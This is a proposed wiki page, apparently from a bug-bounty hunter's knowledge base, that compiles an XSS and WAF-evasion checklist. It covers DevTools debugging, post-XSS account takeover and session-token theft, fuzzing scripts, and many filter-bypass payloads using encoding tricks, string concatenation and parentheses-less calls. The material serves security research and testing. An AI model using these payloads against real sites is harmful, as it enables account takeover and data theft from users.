---
type: llm-wiki-review
status: needs-review
decision: pending
revision: 1
operation: create
target: web-and-bug-bounty/concepts/xss-and-waf-evasion-tradecraft.md
sources:
  - Notes/Narroto-Guts Hunt/Tips and Tricks.md
---

# Proposed Wiki change

## What will change
Compile deep checklist note for XSS, DOM state analysis, and WAF filter evasion tradecraft.

## Proposed content
```markdown
---
title: "XSS & Client-Side WAF Evasion Tradecraft (Comprehensive Checklist)"
created: 2026-09-29
updated: 2026-09-29
type: concept
parent: "[[web-and-bug-bounty]]"
cluster: web-and-bug-bounty
tags:
  - xss
  - payload
  - bug-bounty
  - triage
sources:
  - Notes/Narroto-Guts Hunt/Tips and Tricks.md
confidence: high
contested: false
contradictions: []
---
# XSS & Client-Side WAF Evasion Tradecraft (Comprehensive Checklist)

<!-- TOC_START -->
<!-- TOC_END -->

## Overview
Cross-Site Scripting (XSS) detection and exploitation in modern applications requires deep client-side debugging, understanding parser state transitions, and bypassing intermediate Web Application Firewalls (WAFs) and client-side sanitizers.

## Diagnostic & Debugging Checklist

- [ ] **Pause DOM State**: Freeze the browser's execution state at the exact moment of DOM mutation using `debugger;` or the `Escape` key in DevTools to inspect intermediate objects before page navigation.
- [ ] **Trigger Controlled Exceptions**: Throw errors in URL handling or parsing functions to trace the execution call stack:
  - Inject unexpected hex characters such as `%0A` (line feed).
  - Inject custom protocol schemes such as `tel:` or `sms:` to observe protocol handler exceptions.
- [ ] **Event Listener Breakpoints**: Enable triggers under *DevTools -> Sources -> Event Listener Breakpoints* for `DOM Mutation`, `Control`, and `Timer` events.
- [ ] **Audit Framework Gotchas**: Check client-side rendering behaviors specific to frameworks (React `dangerouslySetInnerHTML`, Angular template expressions, Vue `v-html`).

## Post-XSS Weaponization Checklist

- [ ] **Account Takeover (ATO)**:
  - Immediate password change via authenticated background fetch.
  - Account binding / integration hijacking (linking the victim's account to an attacker-controlled third-party provider).
- [ ] **Sensitive Data & PII Exfiltration**:
  - Extract session tokens from `localStorage` and `sessionStorage`.
  - Scrape anti-CSRF tokens from hidden DOM forms to execute privileged API calls.

## WAF & Filter Bypass Checklist

### 1. HTML Tag & Whitespace Fuzzing
- [ ] **Whitespace Fuzzing**: Fuzz all allowable whitespace bytes between tags and attribute names:
  ```javascript
  const div = document.createElement('div');
  const result = [];
  const worked = p => result.push(p);
  for (let i = 0; i <= 0x10ffff; ++i) {
    div.innerHTML = `<img${String.fromCodePoint(i)}src${String.fromCodePoint(i)}onerror=worked(${i})>`;
  }
  document.body.appendChild(div);
  ```
- [ ] **JavaScript Protocol Fuzzing**: Fuzz character insertions within `javascript:` schemes:
  ```javascript
  const log = [];
  const anchor = document.createElement('a');
  for (let i = 0; i < 0x10ffff; i++) {
    anchor.href = `javascript${String.fromCodePoint(i)}:alert(1)`;
    if (anchor.protocol === 'javascript:') { log.push(i); }
  }
  ```
- [ ] **Server-Side Valid Tag Fuzzing (`<ta[FUZZ]g>`)**: Fuzz invalid tag characters that are normalized into valid tags by back-end parsers after the WAF ruleset has already evaluated the payload (*change after ruleset is a killer*).
- [ ] **WAF Confusion via Encoding**:
  - `<img src &#x3E onerror=alert(1)>` (HTML entity encoding closing bracket)
  - `<!-- <img/src onerror=alert(origin)> --!>` (Malformed HTML comment syntax)
  - `<img src="/" =_='' title="onerror='prompt(origin)'" >` (Attribute injection confusion)
  - `<!<script>confirm(origin)</script>` (Malformed opening delimiter)

### 2. JavaScript Execution & String Concatenation
When keywords like `alert`, `prompt`, `document`, or `eval` are filtered:

- [ ] **Constructor String Concatenation**:
  ```javascript
  []['cons' + 'tructor']['const' + 'ructor']('aler' + 't(origin)')()
  ```
- [ ] **Global Context Access**:
  ```javascript
  this['aler' + 't']()
  a = this; a['a' + 'lert'](origin)
  ```
- [ ] **Custom Window Reflection Discovery**:
  Enumerate custom application window variables that mirror global context to bypass static keyword detection:
  ```javascript
  for (let x in window) {
    if (window[x] === window) console.log(x);
  }
  for (let x in _W) {
    for (let y in _W[x]) {
      if (_W[x][y] === window) console.log(x, y);
    }
  }
  ```
- [ ] **Tag ID Misuse as Window Variables**: In modern browsers, HTML elements with an `id` attribute are automatically exposed as named global variables on `window`. An attacker can manipulate existing element IDs as execution bridges.
- [ ] **Fragment Splitting**: Pass script payloads inside the URL hash to evade server-side inspection:
  ```javascript
  location = location.hash.split('#')[1] // #javascript:alert(origin)
  ```
- [ ] **Unicode Escape Sequences**:
  - `\u{0061}` (translates to `a`)
  - Long-form padding: `\u{000000000000000000000061}`

### 3. Parentheses-Less & Delimiter-Less Payloads
When parentheses `()` or brackets `[]` are blocked by sanitizers:

- [ ] **Optional Chaining**: `alert?.(origin)` or `(1, alert)?.(origin)`
- [ ] **Function Assignment & Invocation**:
  ```javascript
  a = alert; a(origin);
  [alert][0].call(this, origin);
  ```
- [ ] **Type Coercion via `valueOf`**:
  ```javascript
  window.valueOf = alert; window + 1; // triggers execution upon string/number coercion
  ```

## Related Pages
- [[web-and-bug-bounty]]
- [[cross-site-scripting]]
- [[stored-vs-reflected-vs-dom-xss]]
- [[dom-debugging-and-sink-analysis]]
- [[recollapse]]
```

## Evidence and uncertainty
Documented from canonical notes in Notes/Narroto-Guts Hunt/ (Live Hunts, Structures, Tips and Tricks).

## Human feedback
Optionally explain or edit what should change.
